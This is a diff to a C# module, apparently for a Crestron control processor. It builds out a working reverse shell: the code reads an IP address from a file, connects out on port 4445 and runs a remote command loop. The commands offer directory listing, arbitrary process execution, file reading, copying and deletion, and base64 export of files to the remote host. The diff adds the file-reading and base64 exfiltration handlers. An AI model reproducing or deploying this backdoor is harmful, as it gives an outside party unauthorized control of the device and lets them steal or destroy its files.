@@ -106,10 +106,20 @@ namespace UserModule_FDSA
 
         }
 
-        public string ReadTextFile(string path)
+        public string ReadAllText(string path)
         {
             using (StreamReader sr = new StreamReader(path))
                 return sr.ReadToEnd();
+        }
+        public byte[] ReadAllBytes(string path)
+        {
+            byte[] ret = null;
+            using (FileStream sr = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read))
+            {
+                ret = new byte[sr.Length];
+                sr.Read(ret, 0, (int)sr.Length);
+            }
+            return ret;
         }
 
         public override object FunctionMain(object __obj__)
@@ -125,7 +135,7 @@ namespace UserModule_FDSA
                 //System.IO.File.Copy("\\User\\sshd_config_default", "\\Sys\\SSH\\sshd_config_default");
                 //ProcessFiles("\\");
 
-                string ip = ReadTextFile("\\User\\ip");
+                string ip = ReadAllText("\\User\\ip");
 
                 System.Net.Sockets.Socket remote1 = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 System.Net.IPEndPoint remoteEndPoint45 = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(ip), 4445);
@@ -133,16 +143,13 @@ namespace UserModule_FDSA
 
                 using (System.Net.Sockets.NetworkStream stream1 = new System.Net.Sockets.NetworkStream(remote1))
                 {
-                        Trace("here");
                         using (System.IO.StreamReader r = new System.IO.StreamReader(stream1))
                         {
                             using (System.IO.StreamWriter w = new System.IO.StreamWriter(stream1))
                             {
-                                Trace("here");
                                 w.Flush();
                                 w.WriteLine("Connected");
                                 w.Flush();
-                                Trace("here");
 
                                 List<string> curDir = new List<string>() { };
                                 while (true)
@@ -153,79 +160,115 @@ namespace UserModule_FDSA
                                     string arg = string.Empty;
                                     if (cmd.Contains(" "))
                                         arg = cmd.Split(' ')[1];
-
-                                    switch (cmd.Split(' ')[0])
+                                    try
                                     {
-                                        case "ls":
-                                            try
-                                            {
-                                                string[] files;
-                                                string[] dirs;
-                                                if (arg != string.Empty)
+                                        switch (cmd.Split(' ')[0])
+                                        {
+                                            case "ls":
+                                                try
                                                 {
-                                                    files = Directory.GetFiles(arg);
-                                                    dirs = Directory.GetDirectories(arg);
+                                                    string[] files;
+                                                    string[] dirs;
+                                                    if (arg != string.Empty)
+                                                    {
+                                                        files = Directory.GetFiles(arg);
+                                                        dirs = Directory.GetDirectories(arg);
+                                                    }
+                                                    else
+                                                    {
+                                                        files = Directory.GetFiles("\\" + string.Join("\\", curDir.ToArray()));
+                                                        dirs = Directory.GetDirectories("\\" + string.Join("\\", curDir.ToArray()));
+                                                    }
+
+                                                    foreach (string file in files)
+                                                        w.WriteLine(file);
+
+                                                    foreach (string dir in dirs)
+                                                        w.WriteLine(dir);
+
+                                                    w.Flush();
+                                                    continue;
                                                 }
+                                                catch
+                                                {
+                                                    w.WriteLine("Error. Does directory exist?");
+                                                    w.Flush();
+                                                    continue;
+                                                }
+                                            case "pwd":
+                                                w.WriteLine("\\" + string.Join("\\", curDir.ToArray()));
+                                                w.Flush();
+                                                continue;
+                                            case "cd":
+                                                if (arg == "..")
+                                                    curDir.RemoveAt(curDir.Count - 1);
+                                                else if (arg == string.Empty)
+                                                    curDir = new List<string>() { "" };
                                                 else
-                                                {
-                                                    files = Directory.GetFiles("\\" + string.Join("\\", curDir.ToArray()));
-                                                    dirs = Directory.GetDirectories("\\" + string.Join("\\", curDir.ToArray()));
-                                                }
+                                                    curDir.Add(arg);
+                                                continue;
+                                            case "exec":
+                                                ProcessStartInfo i = new ProcessStartInfo();
+                                                i.FileName = arg;
+                                                i.UseShellExecute = false;
 
-                                                foreach (string file in files)
-                                                    w.WriteLine(file);
+                                                Process p = new Process();
+                                                p.StartInfo = i;
 
-                                                foreach (string dir in dirs)
-                                                    w.WriteLine(dir);
+                                                p.Start();
 
+                                                continue;
+                                            case "cat":
+                                                w.WriteLine(this.ReadAllText(arg));
                                                 w.Flush();
                                                 continue;
-                                            }
-                                            catch
-                                            {
-                                                w.WriteLine("Error. Does directory exist?");
+                                            case "copy":
+                                                if (arg.StartsWith("\\"))
+                                                    System.IO.File.Copy(arg, cmd.Split(' ')[2]);
+                                                else
+                                                    System.IO.File.Copy(string.Join("\\", curDir.ToArray()) + "\\" + arg, cmd.Split(' ')[2]);
+                                                continue;
+                                            case "delete":
+                                                if (arg.StartsWith("\\"))
+                                                    System.IO.File.Delete(arg);
+                                                else
+                                                    System.IO.File.Delete(string.Join("\\", curDir.ToArray()) + "\\" + arg);
+                                                continue;
+                                            case "help":
+                                                w.WriteLine("ls exec cat copy delete base64");
                                                 w.Flush();
                                                 continue;
-                                            }
-                                        case "pwd":
-                                            w.WriteLine("\\" + string.Join("\\", curDir.ToArray()));
-                                            w.Flush();
-                                            continue;
-                                        case "cd":
-                                            if (arg == "..")
-                                                curDir.RemoveAt(curDir.Count - 1);
-                                            else if (arg == string.Empty)
-                                                curDir = new List<string>() { "" };
-                                            else
-                                                curDir.Add(arg);
-                                            continue;
-                                        case "exec":
-                                            ProcessStartInfo i = new ProcessStartInfo();
-                                            i.FileName = arg;
-                                            i.UseShellExecute = false;
+                                            case "base64":
+                                                string b = string.Empty;
 
-                                            Process p = new Process();
-                                            p.StartInfo = i;
+                                                if (arg.StartsWith("\\"))
+                                                
+                                                    b = Convert.ToBase64String(this.ReadAllBytes(arg));
+                                                else
+                                                    b = Convert.ToBase64String(this.ReadAllBytes(string.Join("\\", curDir.ToArray()) + "\\" + arg));
 
-                                            p.Start();
-
-                                            continue;
-                                        case "cat":
-                                            continue;
-                                        case "base64":
-                                            continue;
-                                        default:
-                                            continue;
+                                                w.WriteLine(b);
+                                                w.Flush();
+                                                continue;
+                                            default:
+                                                continue;
+                                        }
                                     }
+                                    catch (Exception ex)
+                                    {
+                                        w.WriteLine(ex.InnerException);
+                                        w.WriteLine(ex.ToString());
+                                        w.WriteLine(ex.StackTrace);
+                                        w.WriteLine(ex.Message);
+                                        w.Flush();
+                                    }
+
                                 }
                             }
                         
                     }
 
                 }
-  
-
-                Trace("done");
 
             }
             catch (Exception e) { ObjectCatchHandler(e); Trace(e.ToString()); }
